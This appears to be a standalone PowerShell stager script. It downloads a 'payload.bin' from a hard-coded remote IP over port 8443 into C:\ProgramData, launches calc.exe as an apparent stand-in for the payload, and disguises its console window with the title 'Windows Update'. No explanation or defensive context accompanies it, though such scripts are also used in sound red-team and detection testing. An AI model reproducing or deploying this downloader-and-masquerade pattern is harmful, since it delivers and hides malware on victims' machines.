$FetchUrl = 'https://203.0.113.222:8443/downloads/payload.bin'
$WorkingPath = "C:\ProgramData\stage1.bin"
$StageTimeout = 187
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $OperationResult = Get-Stage2Payload -SourceUrl $FetchUrl -DestinationPath $WorkingPath -TimeoutSec $StageTimeout -UserAgent $UserAgent
    if ($OperationResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$Host.UI.RawUI.WindowTitle = "Windows Update"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
